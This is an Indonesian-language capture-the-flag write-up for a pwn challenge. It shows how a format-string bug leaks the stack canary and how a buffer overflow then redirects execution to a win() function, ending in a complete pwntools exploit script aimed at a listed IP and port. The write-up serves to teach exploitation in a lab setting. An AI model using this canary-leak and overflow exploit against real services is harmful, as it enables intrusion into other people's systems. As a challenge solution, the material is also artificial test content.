# PWN

## Author

Nikoo

## Categories

Pwn 

## Description

Sistem pendataan sederhana. Masukkan nama lengkap dan username CTF-mu, lalu temukan flag yang tersembunyi di server.

Flag format: `LKS{...}`

## Attachment

- `nc 54.151.244.93 9999`
- binary: `chall`

## Solver

### Step 1: Analisis binary & cek proteksi

Jalankan `checksec` terhadap binary yang diberikan:

```
$ checksec --file=chall
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
```

**Hasil:** Stack canary aktif dan NX aktif, jadi overflow polos (shellcode di stack) maupun overwrite return address tanpa canary yang benar akan langsung memicu `*** stack smashing detected ***`. PIE tidak aktif, artinya semua alamat di binary (termasuk fungsi `win()`) selalu tetap di setiap run, nggak perlu bocorin base address dulu.

---

### Step 2: Temukan dua bug di alur program

Disassembly fungsi `vuln()` (`objdump -d chall -M intel --disassemble=vuln`) menunjukkan dua celah:

1. Input pertama (`nama lengkapmu`) dimasukkan langsung ke `printf()` sebagai format string, bukan `printf("%s", ...)` — ini **format string vulnerability**.
2. Input kedua (`username ctfmu`) dibaca pakai `read(0, buf, 200)`, padahal buffer-nya cuma 72 byte — ini **stack buffer overflow** yang cukup jauh buat nimpa canary dan return address sekaligus.

**Hasil:** Bug #1 bisa dipakai buat membongkar nilai canary, lalu bug #2 dipakai buat overwrite return address — asal canary yang ditimpa balik sama persis dengan aslinya.

---

### Step 3: Leak canary lewat format string

Canary x86-64 selalu diawali byte `0x00` (biar fungsi string klasik berhenti baca di situ), tapi posisi argumen ke berapa di `printf` yang mengarah ke canary belum diketahui. Brute force `%N$lx`:

```
Sebutkan nama lengkapmu: %25$lx
Halo, 7a1e4c9f2b803d00
```

**Hasil:** Value 8 byte yang konsisten berakhiran `00` (dan berubah setiap koneksi baru) itu adalah canary. Posisi offset-nya bisa berbeda tiap deployment/environment, jadi solver otomatis mencoba range `%6$lx` sampai `%40$lx` sampai ketemu pola yang cocok.

---

### Step 4: Hitung jarak buffer ke canary & cari alamat `win()`

Dari disassembly yang sama terlihat layout stack:

```
lea rax,[rbp-0x50]   ; buffer username
mov QWORD PTR [rbp-0x8],rax ; canary
```

**Hasil:** Jarak dari awal buffer `username` ke canary adalah `0x50 - 0x8 = 0x48` = **72 byte**. Alamat fungsi `win()` diambil otomatis dari simbol ELF-nya (`nm chall | grep win`), nggak perlu cari manual lewat gdb.

---

### Step 5: Fix stack alignment dengan gadget `ret`

Percobaan pertama lompat langsung ke `win()` sukses menjalankan `puts()`, tapi crash (`SIGSEGV`) begitu masuk `system()` — ini karena `ret2win` lewat `ret` murni menggeser stack alignment, dan `system()` di glibc modern butuh stack 16-byte aligned (pakai instruksi SSE di dalamnya). Fix-nya: selipkan satu gadget `ret` tunggal sebelum lompat ke `win()`, supaya stack bergeser 8 byte tambahan dan alignment-nya kembali benar.

```
objdump -d chall | grep -E "^\s+[0-9a-f]+:\s+c3\s+ret"
```

**Hasil:** Ketemu beberapa gadget `ret` tunggal di binary, salah satunya dipakai buat benerin alignment sebelum eksekusi lompat ke `win()`.

---

### Step 6: Susun payload & eksekusi

Struktur payload overflow:

```
[72 byte padding] + [canary 8 byte] + [8 byte junk, saved rbp] + [gadget ret] + [alamat win()]
```

Canary yang ditimpa balik harus persis sama dengan yang di-leak di Step 3, supaya `__stack_chk_fail` tidak terpicu saat fungsi `return`.

**Hasil:** `__stack_chk_fail` tidak terpicu, return address berhasil diarahkan ke `win()`, dan `win()` menjalankan `system("/bin/cat /flag.txt")`.

---

### Script Exploit

```python
from pwn import *

context.clear(arch='amd64')

elf = ELF('./chall')

WIN = elf.symbols['win']
RET = ROP(elf).find_gadget(['ret'])[0]
PAD = 72

for offset in range(6, 40):
    p = remote('54.151.244.93', 9999)
    p.sendlineafter(b'nama lengkapmu: ', f'%{offset}$lx'.encode())
    p.recvuntil(b'Halo, ')
    val = p.recvline().strip()
    if len(val) == 16 and val.endswith(b'00'):
        break
    p.close()
else:
    log.error('Offset canary tidak ketemu')

canary = int(val, 16)
log.success(f'Offset: {offset}, Canary: {hex(canary)}')

payload = flat({
    0: b'A' * PAD,
    PAD: p64(canary),
    PAD + 8: b'B' * 8,
    PAD + 16: p64(RET),
    PAD + 24: p64(WIN),
})
p.sendlineafter(b'username ctfmu: ', payload)

p.interactive()
```

**Flag**
```
LKS{ganti_dengan_flag_asli_sebelum_deploy}
```
